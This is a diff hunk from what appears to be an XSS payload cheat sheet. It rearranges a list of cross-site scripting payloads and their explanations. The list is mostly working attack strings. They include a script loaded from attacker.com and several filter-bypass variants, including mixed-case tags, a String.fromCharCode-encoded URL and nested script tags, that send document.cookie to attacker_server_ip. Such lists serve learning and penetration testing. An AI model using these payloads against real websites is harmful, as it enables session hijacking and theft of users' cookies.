@@ -5,12 +5,12 @@
 <script>alert(1)<!–                               <!- is the start of an HTML comment. This payload will comment out the rest of the line in the HTML document to prevent syntax errors.
 <a onmouseover"alert(1)">test</a>                 This payload inserts a link that will cause JavaScript to execute after a user hovers over the link with their cursor.
 <script src=//attacker.com/test.js>               This payload causes the browser to load and run an external script hosted on the attacker’s server.
-<img src="123" onerror="alert('XSS Bypass');"/>   Bypass XSS Protection
-<a href="javascript:alert('XSS Bypass')>Click me!</a>" Bypass XSS Protection
-<scrIPT>location='http://attacker_server_ip/c='+document.cookie;</scrIPT>  Bypass XSS Protection
+
+Bypass XSS Protection
+<img src="123" onerror="alert('XSS Bypass');"/>   
+<a href="javascript:alert('XSS Bypass')>Click me!</a>" 
+<scrIPT>location='http://attacker_server_ip/c='+document.cookie;</scrIPT>  
 <scrIPT>location=String.fromCharCode(104, 116, 116, 112, 58, 47,
 47, 97, 116, 116, 97, 99, 107, 101, 114, 95, 115, 101, 114, 118,
-101, 114, 95, 105, 112, 47, 63, 99, 61)+document.cookie;</scrIPT> Bypass XSS Protection
-<scrip<script>t>
-location='http://attacker_server_ip/c='+document.cookie;
-</scrip</script>t>    Bypass XSS Protection                 
+101, 114, 95, 105, 112, 47, 63, 99, 61)+document.cookie;</scrIPT> 
+<scrip<script>t> location='http://attacker_server_ip/c='+document.cookie; </scrip</script>t>             
